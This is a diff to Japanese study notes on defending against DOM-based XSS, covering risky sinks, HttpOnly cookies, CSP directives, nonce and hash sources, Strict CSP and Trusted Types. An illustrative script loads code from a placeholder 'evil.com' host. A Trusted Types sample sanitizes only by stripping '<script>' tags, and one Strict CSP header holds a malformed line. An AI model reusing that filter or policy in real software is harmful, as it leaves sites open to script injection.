@@ -650,7 +650,7 @@ XSS攻撃は以下の流れで実行される：<br>
 
 ##### Sink（シンク）: ソースからJavaScriptを生成・実行してしまう箇所（出口）
 - innerHTML, outerHTML
-- document.write(), document.writeln()
+- document.write(), document.writeln() （※現状非推奨）
 - insertAdjacentHTML()
 - $.html() （※ jQuery を使用している場合）
 - eval()
@@ -659,14 +659,287 @@ XSS攻撃は以下の流れで実行される：<br>
 - element.src への代入
 - location.href への代入
 
+> [!IMPORTANT]
+> 結局、DOM型XSSの予防策としては極力これら「シンク」となる機能を使わないのに限る。
+
 #### 対策
 1. サニタイズなどのエスケープ処理
+  - 例えば、`<a>`の`href`属性の値で、`javascript:`に続いて指定された任意のJavaScript（例：`javascript:evilAttack(1)`）は`<a>`がクリックされると実行されてしまう。**ユーザー操作によるリンク生成機能を用意する場合は注意**。
+
 2. HTTPOnlyフラグ付きCookieを用いてJavaScriptからのアクセスを制御する（※セッションハイジャック対策）
-3. CSP（Content Security Policy）というブラウザの機能で、サーバーから許可されていないJavaScriptの実行やリソース読み込みなどをブロックする
+  - サーバーサイドでCookieを発行する際にHTTPOnly属性を付与することでCookie（に格納しているセッションIDなど）の漏洩リスクを軽減する。
+```js
+// NG例
+Set-Cookie: SESSIONID=abcdef123456
+
+document.cookie; // 'SESSIONID=abcdef123456'が返ってくる
+
+// OK例
+Set-Cookie: SESSIONID=abcdef123456; HTTPOnly
+document.cookie; // ''（空文字）が返ってくる
+```
+
+3. CSP（Content Security Policy）というブラウザの機能で、サーバーから許可されていない JavaScript の実行やリソース読み込みなどをブロックする。ほとんどのブラウザがサポート済み。
 ```html
-<meta http-equiv="Content-Security-Policy" content="script-src 'self';">
+<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
 ```
 
 ---
 
-最も賢明なのはXSS対策を自動で行ってくれるようなライブラリ（React, Vue）やフレームワーク（Next.js Nuxt）を使用すること。<br>※ただし、 dangerouslySetInnerHTML（React） や v-html（Vue） を使用する場合は注意が必要
+最も賢明なのはXSS対策を自動で行ってくれるようなライブラリ（React, Vue）やフレームワーク（Next.js Nuxt）を使用すること。<br>※ただし、`dangerouslySetInnerHTML`（React）や`v-html`（Vue）を使用する場合は注意が必要。<br><br>
+
+自前実装する場合は、パース系のライブラリ（例：[`html-react-parser`](https://www.npmjs.com/package/html-react-parser), [`DOMPurify`](https://github.com/cure53/DOMPurify)）を用いたり、[Sanitizer API（HTMLコンテンツのサニタイズを行うWeb標準API）](./sethtml-guide.md/#sanitizer-api)を用いたりして安全に実装する必要がある。
+
+## CSP（Content Security Policy）
+CSPは、XSSなど不正なコードを埋め込むインジェクション攻撃を検知して被害の発生を防ぐためのブラウザの機能。サーバーから許可されていない JavaScript の実行やリソース読み込みなどをブロックする。ほとんどのブラウザがサポート済み。
+
+### CSPの設定方法（HTTPヘッダ または `meta`要素に設定）
+CSPは、`Content-Security-Policy`ヘッダをページのレスポンスに含めるか、HTMLの`meta`要素にCSP設定を埋め込むことで有効化できる<br>
+※ただし、HTMLの`meta`要素にCSP設定を埋め込む場合はHTTPヘッダでのCSP設定が優先されたり、一部の設定が使えなかったりするので注意。
+  
+- `Content-Security-Policy`ヘッダをページのレスポンスに含める
+```bash
+Content-Security-Policy: script-src *.trusted.example.com
+```
+
+- HTMLの`meta`要素にCSP設定を埋め込む
+```bash
+Content-Security-Policy: script-src *.trusted.example.com
+```
+
+```html
+<meta 
+  http-equiv="Content-Security-Policy" 
+  content="script-src *.trusted.example.com"
+>
+```
+
+### ディレクティブ（ポリシーディレクティブ）
+前述を例とすると、`script-src *.trusted.example.com`のような値の箇所。<br>
+ディレクティブは、コンテンツの種類ごとにどのようなリソースを読み込むかの制限指定を行う。<br>
+`meta`要素の場合は`content`属性にディレクティブを指定する。
+
+#### `script-src *.trusted.example.com`の場合
+trusted.example.com およびそのサブドメインの（JavaScript）ファイルのみ読込許可する。<br>
+※ディレクティブに指定されていないホスト名のサーバーからは、JavaScriptファイルを一切読み込まない（ブロックしてエラーとなる）。
+
+#### `'self'`キーワードで自身（のホスト）を対象外にする
+CSPは、自身のドメインでホスティングしているJavaScriptファイルの読込も制限するので、同一ホストから読み込みたい場合は`'self'`キーワードを指定する
+```bash
+Content-Security-Policy: script-src 'self' *.trusted.example.com
+```
+
+##### `;`で区切って複数のディレクティブを指定することも可能
+```bash
+Content-Security-Policy: default-src 'self'; script-src 'self' *.trusted.example.com
+```
+
+#### CSPの代表的なディレクティブ一覧
+- default-src
+  - すべてのリソースタイプのデフォルトポリシーを設定。指定されていないディレクティブを一括で許可する
+  - 以下項目に続く、他の*-srcディレクティブが指定されていない場合のフォールバック
+
+- script-src
+  - JavaScriptの実行を制御
+
+- style-src
+  - CSSスタイルシートの読み込み（適用許可）を制御
+
+- img-src
+  - 画像の読み込み元を制御
+
+- font-src
+  - フォントファイルの読み込み元を制御
+
+- connect-src
+  - XMLHttpRequest、fetch()、WebSocketなどの接続先を制御
+
+- media-src
+  - 音声・動画メディアの読み込み元を制御
+
+- frame-src
+  - iframe内で読み込み可能なURLを制御
+
+- form-action
+  - フォームの送信先URLを制御
+
+- frame-ancestors
+  - iframeなどで現在のページの埋め込み許可を制御
+
+- upgrade-insecure-requests
+  - HTTPリクエストを自動的にHTTPSに変換
+
+- block-all-mixed-content
+  - 混在コンテンツ（HTTPS内のHTTPリソース）をブロック
+
+- report-uri
+  - CSP違反時のレポート送信先URL
+
+- sandbox
+  - コンテンツをサンドボックス化して隔離させることで外部からのアクセスを制御する
+
+---
+
+`meta`要素の場合は以下のディレクティブは指定不可能
+- frame-ancestors
+- report-uri
+  - `Report-Only モード`も設定不可
+- sandbox
+
+##### CSPに指定できるソースのキーワード
+- 'self'
+  - 同一オリジン（プロトコル、ドメイン、ポート）のリソースを許可
+
+- 'none'
+  - すべてのリソースを拒否
+
+- 'unsafe-inline'（※セキュリティリスク有）
+  - script-src や style-src ディレクティブにて、インラインスクリプト（※`<script>`要素を使った記述）やインラインスタイル（※`<style>`要素や`style`属性を使ったスタイル指定）を許可
+
+- 'unsafe-eval'（※セキュリティリスク有）
+  - script-src ディレクティブにて eval() や Function() コンストラクタの使用を許可
+
+- 'unsafe-hashes'（※セキュリティリスク有）
+  - script-src ディレクティブにて、DOMに設定された onclick, onfoucus などのイベントハンドラーの実行は許可するが、`<script>`要素を使ったインラインスクリプトや`javascript:`スキームを使ったJavaScriptの実行は許可しない
+
+---
+
+CSPを適用したページでは、明示的に`'unsafe-inline'`キーワードを用いないとインラインスクリプトやスタイルは禁止されているので使用できない。これを回避（して安全にインラインスクリプト・スタイルを実装）するために、`nonce-source`や`hash-source`と呼ばれるCSPヘッダのソースを利用する。
+
+### Strict CSP
+ディレクティブにホスト名を指定したCSP設定ではXSSの脆弱性が発生するケースがあるらしく、Googleではホスト名を指定する代わりに`nonce-source`や`hash-source`を使った「Strict CSP」を推奨しているそう。
+
+```bash
+Content-Security-Policy: 
+  script-src 'nonce-r4nd0m123abc' 'strict-dynamic';
+  style-src 'nonce-r4nd0m123abc';
+  https: 'unsafe-inline';
+  object-src 'none';
+  base-uri 'none';
+  require-trusted-types-for 'script'
+```
+
+- 'strict-dynamic'
+  - 信頼できるスクリプトから動的に生成されたスクリプトを許可
+
+```html
+<script nonce="r4nd0m123abc">
+  // nonce-source や hash-source が設定されたページでもスクリプトの動的生成は禁止されている
+  // しかし、'strict-dynamic'をCSPヘッダに設定しておくことで制限が解除される
+  const s = document.createElement('script');
+  s.src = "https://evil.com/evilAttack.js";
+  document.body.appendChild(s); 
+
+  // ただし、innerHTML や document.write は'strict-dynamic'を使っても無効となる
+  document.querySelector('h1').innerHTML = `<span>innerHTML や document.write は'strict-dynamic'を使っても無効</span>`
+</script>
+```
+
+- object-src
+  - `<object>`, `<embed>`, `<applet>`要素の制御
+  - `object-src 'none'`と指定することで Flash などのプラグインを悪用した攻撃を防げる
+
+- base-uri
+  - `<base>`要素（そのページ内のリンクやリソースのURL基準となるURL{例：相対パス}を設定する）で使用可能なURLを制御
+  - `base-uri 'none'`と指定することで、攻撃者によって罠サイトへのURLへと変更されるような`<base>`要素の挿入をブロックする
+
+#### nonce-source
+- 概要: サーバーが生成する一意のランダム値（トークン）を使用してスクリプトを許可
+- 形式: `'nonce-[BASE64値]'`
+- 特徴: リクエストごとに異なる値（トークン）を生成し、予測不可能
+
+```bash
+Content-Security-Policy: script-src 'nonce-r4nd0m123abc'
+```
+
+- nonce属性を用いたインラインスクリプトの実行可否の例<br>
+※事例は`<script>`要素のインラインスクリプトだが、`<script>`要素を用いたJavaScriptファイルの読込も、同様にnonce属性がないと拒否される。
+```html
+<!-- 許可されるスクリプト -->
+<script nonce="r4nd0m123abc">
+  console.log('This script is allowed');
+</script>
+
+<!-- 拒否されるスクリプト（nonceなし） -->
+<script>
+  console.log('This script is blocked');
+</script>
+```
+
+> [!NOTE]
+> nonce-source が有効なページでは、onclick属性などで指定されたイベントハンドラーの実行が禁止される<br>
+> 対応としては`addEventListener`でクリックイベントを指定する
+
+#### hash-source
+- 概要: スクリプトやスタイルの内容をハッシュ化（ハッシュ値を指定）して許可。<br>ハッシュ値が異なればそのスクリプトは実行されないので hash-source は常に同じ値でも問題ない。<br>HTML, CSS, JavaScript のみで構成された静的サイトの場合、リクエストごとに nonceの値を生成できないが、 hash-source だと安全にCSPを設定できる
+- 形式: `'sha256-[ハッシュ値]'`, `'sha384-[ハッシュ値]'`, `'sha512-[ハッシュ値]'`
+- 特徴: スクリプトの内容が変更されるとハッシュ値も変わるため、改ざんを検知可能
+
+```bash
+Content-Security-Policy: script-src 'sha256-xyz123...'
+```
+
+### Trusted Type
+Trusted Typeとは、WebアプリケーションでXSS攻撃を防ぐためのWeb標準APIを指す。危険なDOM APIへの**文字列の直接代入を制限**し、代わりに「信頼できる型」を使用する（＝**ポリシーを強制する**）ことで悪意のあるスクリプトの実行を防ぐ。<br>
+このポリシーの強制が重要で、例えばサニタイズ処理用の関数を用意していたとしても開発者が実装漏れするリスクがある。Trusted Typeを指定しておけば（ポリシー強制によって）漏れの心配がなく、リスク検知を行ってくれる。
+
+- CSPでの設定
+  - HTTPヘッダ
+```bash
+Content-Security-Policy: require-trusted-types-for 'script';
+Content-Security-Policy: trusted-types myPolicy defaultPolicy;
+```
+
+  - `meta`要素
+```html
+<meta http-equiv="Content-Security-Policy" 
+      content="require-trusted-types-for 'script'">
+```
+
+- 実装例
+```js
+// ポリシーの作成
+const policy = trustedTypes.createPolicy('myPolicy', {
+  createHTML: (string) => {
+    // サニタイズ処理
+    return string.replace(/<script>/gi, '');
+  }
+});
+
+// 安全な使用方法
+element.innerHTML = policy.createHTML('<div>安全なHTML</div>');
+
+// これはエラーになる（文字列の直接代入）
+// element.innerHTML = '<div>直接代入</div>'; // TypeError
+```
+
+```js
+// ブラウザ対応チェック付き
+if (window.trustedTypes && trustedTypes.createPolicy) {
+    const policy = trustedTypes.createPolicy('sanitizer', {
+        createHTML: (string) => {
+            // DOMPurifyなどを使用
+            return DOMPurify.sanitize(string);
+        }
+    });
+    
+    element.innerHTML = policy.createHTML('<p>コンテンツ</p>');
+} else {
+    // Trusted Types未対応の場合
+    element.innerHTML = '<p>コンテンツ</p>';
+}
+```
+
+#### 制限対象となるDOM API
+- innerHTML, outerHTML
+- insertAdjacentHTML
+- document.write
+- eval
+- `<script>`要素の src属性など
+
+#### 型の種類：
+- TrustedHTML：HTML文字列用
+- TrustedScript：JavaScript文字列用
+- TrustedScriptURL：スクリプトURL用
+
+### Report-Only モード
